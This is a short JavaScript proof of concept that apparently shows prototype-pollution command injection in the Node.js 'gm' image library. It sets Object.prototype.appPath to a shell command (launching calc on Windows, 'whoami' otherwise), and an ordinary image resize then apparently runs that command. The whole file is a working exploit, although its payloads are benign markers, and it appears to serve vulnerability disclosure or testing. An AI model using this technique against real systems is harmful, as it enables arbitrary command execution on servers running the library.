if (process.platform == "win32") {
  Object.prototype.appPath = "cmd /s /c calc &";
} else {
  Object.prototype.appPath = "whoami";  // have not been tested 
                                        // whoami exists in Windows and Linux so that may be used for cross-platform testing
}

var gm = require('gm')

gm('img.jpg')
  .resize(240, 240)
  .write('resize.png', function (err) {
    if (!err) console.log('done');
  })
